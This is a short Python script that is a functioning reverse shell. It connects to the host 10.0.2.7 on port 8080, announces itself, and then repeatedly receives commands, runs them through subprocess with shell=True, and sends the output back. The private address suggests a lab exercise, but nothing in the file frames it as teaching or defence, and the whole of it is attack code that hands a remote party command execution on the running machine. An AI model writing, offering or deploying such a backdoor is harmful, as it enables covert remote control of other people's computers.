import socket
import subprocess
import platform

def command_execution(command):
    if platform.system() == "Windows":
        output = subprocess.run(command, shell=True, capture_output=True, text=True).stdout
    else:
        output = subprocess.check_output(command, shell=True, text=True)
    return output

my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_connection.connect(("10.0.2.7", 8080))

my_connection.send(b"GOOD\n")

while True:
    command = my_connection.recv(1024)
    command = command.decode().split()  # Split the command string into a list of arguments

    command_output = command_execution(command)

    my_connection.send(command_output.encode())

my_connection.close()
